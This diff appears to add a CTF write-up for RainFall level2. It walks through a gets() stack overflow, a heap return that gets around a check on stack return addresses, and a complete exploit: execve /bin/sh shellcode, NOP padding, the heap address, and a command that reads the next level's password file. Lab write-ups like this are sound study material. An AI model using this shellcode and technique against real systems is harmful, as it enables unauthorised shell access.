@@ -1,0 +1,104 @@
+scp -P 4242 level2@RainFall:level2 <local_path>
+
+----------------------------------------------------------------------------------
+
+In ghidra dissas de file
+
+We could see that in the main function there is a p function so we explored it:
+                                                                                
+  void p() {                                                                    
+      char buf[76];                 // ebp-0x4c                                 
+      void *saved_eip = ...;        // ebp+0x4                                  
+                                                                                
+      fflush(stdout);
+      gets(buf);                    // ← stack overflow                         
+                                                                                
+      int eip = saved_eip;
+      if ((eip & 0xb0000000) == 0xb0000000) {   // anti-stack-return check ! So our input has to go in the HEAP!!      
+          printf("(%p)\n", eip);                                                
+          _exit(1);                                                             
+      }                                                                         
+                                                                                
+      puts(buf);  
+      strdup(buf);                  // ← copies our buffer onto the HEAP
+  }
+
+----------------------------------------------------------------------------------
+
+ gets() -> NO SIZE LIMIT
+ 
+ So if gets() writes here -> buf[76]		ebp-0x4c
+
+ We'll overwrite EIP with 4					ebp+0x04
+
+ Our Ofset = 76 + 4 = 80 bytes of padding
+
+----------------------------------------------------------------------------------
+
+ We need to find:
+ 
+ 1- The variable at ebp-0x4c
+
+ 2- The mask check	if ((eip & 0xb0000000) == 0xb0000000)
+
+ 3- The heap opportunity: strdup, leave, ret...
+
+ gdb -q ./level2
+ (gdb) disas p
+
+ Between the lines that we found we had:
+
+0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
+
+0x080484fb <+39>: and $0xb0000000,%eax
+0x08048500 <+44>: cmp $0xb0000000,%eax
+0x08048505 <+49>: jne 0x8048527
+
+0x08048538 <+100>: call strdup
+0x0804853d <+105>: leave
+0x0804853e <+106>: ret
+
+strdup is called before ret, so our input is already copied to the heap by the 
+time the function returns. We just need to find where on the heap it lands.
+
+----------------------------------------------------------------------------------
+
+So we create a simple padding:
+
+python -c "print('A'*80 + 'BBBB')" > /tmp/input
+
+NOTE: also possible: python -c "print('A'*76)" > /tmp/input
+
+And we'll find the input's address on the heap:
+
+gdb -q ./level2
+
+(gdb) break *0x0804853d			NEXT INSTRUCTION AFTER strdup()
+
+(gdb) run < /tmp/input
+
+(gdb) info registers eax		READ EAX
+
+eax     ->       0x804a008
+
+----------------------------------------------------------------------------------
+
+EIP (Extended Instruction Pointer): Address of the next instruction the program is going
+to execute. If we overwrite it, we control where the program will 'jump' next
+----------------------------------------------------------------------------------
+
+So now we build the payload:
+
+printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' > /tmp/p
+
+printf '\x90%.0s' $(seq 55) >> /tmp/p
+
+printf '\x08\xa0\x04\x08\n' >> /tmp/p
+
+wc -c /tmp/p
+
+----------------------------------------------------------------------------------
+
+cat /tmp/p - | ./level2
+
+cat /home/user/level3/.pass
